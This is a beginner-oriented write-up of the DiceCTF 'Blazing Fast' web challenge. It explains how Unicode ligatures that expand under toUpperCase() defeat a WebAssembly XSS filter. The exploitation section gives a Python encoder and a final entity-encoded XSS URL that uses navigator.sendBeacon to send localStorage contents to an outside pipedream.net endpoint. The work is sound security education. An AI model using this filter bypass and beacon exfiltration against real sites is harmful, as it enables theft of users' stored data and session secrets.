# Blazing Fast
**category** : web\
**tags** : xss,js,web assembly,toUpperCase\
**url** : [https://blazingfast.mc.ax/](https://blazingfast.mc.ax/)\
**source** : [here](https://github.com/Ryn0K/CTFs/tree/master/dicectf/web/blazingfast)\
**author** : larry

# intro

![intro](https://i.imgur.com/yIuwY13.png)

`Note: i tried everything to writeup this begineer friendly, if you have any questions you can ask in comments.`

# Recon

so, whatever we write,on the basis of odd index converted to uppercase.

![1](https://i.imgur.com/OsgtTiR.png)

we cannot simply `xss`,due to waf

![2](https://i.imgur.com/PUcOWXL.png)

# Analysing source code

```js
let blazingfast = null;

function mock(str) {
	blazingfast.init(str.length);

	if (str.length >= 1000) return 'Too long!';

	for (let c of str.toUpperCase()) {
		if (c.charCodeAt(0) > 128) return 'Nice try.';
		blazingfast.write(c.charCodeAt(0));
	}

	if (blazingfast.mock() == 1) {
		return 'No XSS for you!';
	} else {
		let mocking = '', buf = blazingfast.read();

		while(buf != 0) {
			mocking += String.fromCharCode(buf);
			buf = blazingfast.read();
		}

		return mocking;
	}
}

function demo(str) {
	document.getElementById('result').innerHTML = mock(str);
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {	
	blazingfast = instance.exports;

	document.getElementById('demo-submit').onclick = () => {
		demo(document.getElementById('demo').value);
	}

	let query = new URLSearchParams(window.location.search).get('demo');

	if (query) {
		document.getElementById('demo').value = query;
		demo(query);
	}
})
```

1. wasm is loaded and its functions is used. 
2. anytext under `demo` or query parameter `demo` got pass to function `mock` for filtering and passing data to `wasm`.
3. we are using query parameter `demo` to pass payload.
4. first length got intialize for string provided and string length should not greater than `1000`.
5. character provided in string should not be greater than `128` , and every character pass to `write` of wasm by uppercase using `toUpperCase()` of js

```c
int length, ptr = 0;
char buf[1000];

void init(int size) {
	length = size;
	ptr = 0;
}

char read() {
	return buf[ptr++];
}

void write(char c) {
	buf[ptr++] = c;
}

int mock() {
	for (int i = 0; i < length; i ++) {
		if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
			buf[i] += 32;
		}

		if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
			return 1;
		}
	}

	ptr = 0;

	return 0;
}
```

6. in `wasm` side,`mock()` is used for filtering, odd character converted to uppercase by adding `32` and character should not be `<`,`>`,`&`,`"`.

# Vulnerability ?

from challenge features, we need to find xss but how ? these are the analysis i did during ctf.

1. by looking at challenge code logic ,`length` is intialized before `toUpperCase()`, so somehow we can truncate `length`(to manipulate `loop`) maybe ,we can inject desired characters.

2. To experiment and for poc i wrote this
```html
<!DOCTYPE html>
<script>
for(let i=0 ;i <1000000;++i){
  let c = String.fromCodePoint(i);
  let l_c  = c.length;
  let u = c.toUpperCase();
  let l_u = u.length;
  if(l_u > l_c){
    console.log(`${c}(${l_c}) -> ${u}(${l_u})`);
  }
}
</script>

```
![3](https://i.imgur.com/nMVlZDT.png)

3. you can see `toUpperCase()`, weird behaviour with different characters like (ﬃ,ﬄ,ß,etc...) and with different `lengths` after converting to `uppercase`.

4. So we can use ,this to truncate `length` of payload and inject `xss` payload.

# Exploitation

1. for alerting and confirming my payload work i tried this,

```https://blazingfast.mc.ax/?demo=ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ"><img src=1 onerror=alert(1)>```,i got error cause `alert()` converted to `ALERT()`

2. we need to do this,[https://phackt.com/xss-real-life-case-credentials-stealing](https://phackt.com/xss-real-life-case-credentials-stealing)

3. to make encoded js , i use this

```py
#!/usr/bin/env python3
from urllib.parse import urlencode
payload = ""
url = "https://enuz6evb9ok23xn.m.pipedream.net"
p = 'localStorage.getItem("flag")'
#pay = f'navigator.sendBeacon("{url}",{p})'
pay="alert('1')"
print(pay)
for c in pay:
  if c.islower() or c==' ':
    payload+="&#X"+hex(ord(c))[2:]+";"
  else:
    payload+=c
print(payload)
```

4. final payload 

```https://blazingfast.mc.ax/?demo=ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ"><img src=1 onerror=&#X6e;&#X61;&#X76;&#X69;&#X67;&#X61;&#X74;&#X6f;&#X72;.&#X73;&#X65;&#X6e;&#X64;B&#X65;&#X61;&#X63;&#X6f;&#X6e;("&#X68;&#X74;&#X74;&#X70;&#X73;://&#X65;&#X6e;&#X75;&#X7a;6&#X65;&#X76;&#X62;9&#X6f;&#X6b;23&#X78;&#X6e;.&#X6d;.&#X70;&#X69;&#X70;&#X65;&#X64;&#X72;&#X65;&#X61;&#X6d;.&#X6e;&#X65;&#X74;",&#X6c;&#X6f;&#X63;&#X61;&#X6c;S&#X74;&#X6f;&#X72;&#X61;&#X67;&#X65;.&#X67;&#X65;&#X74;I&#X74;&#X65;&#X6d;("&#X66;&#X6c;&#X61;&#X67;"))>```

# `dice{1_dont_know_how_to_write_wasm_pwn_s0rry}`

# final word....

this challenge was very nice, thanks to `larry`.